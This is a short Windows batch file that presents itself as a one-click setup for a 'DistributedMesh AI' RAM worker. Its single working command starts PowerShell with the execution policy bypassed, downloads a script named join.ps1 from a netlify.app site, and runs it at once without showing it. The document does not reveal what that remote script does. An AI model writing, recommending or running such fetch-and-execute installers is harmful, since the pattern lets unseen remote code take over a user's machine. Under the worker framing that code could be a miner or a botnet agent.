@echo off
title DistributedMesh RAM Worker Setup
setlocal

echo ==============================================================
echo    DistributedMesh AI - RAM Worker One-Click Setup (CMD)
echo    Site: https://ramusageailaptop.netlify.app
echo ==============================================================
echo.

powershell -NoProfile -ExecutionPolicy Bypass -Command "$s='https://ramusageailaptop.netlify.app'; & ([scriptblock]::Create((irm \"$s/join.ps1\"))) -Origin $s"

pause
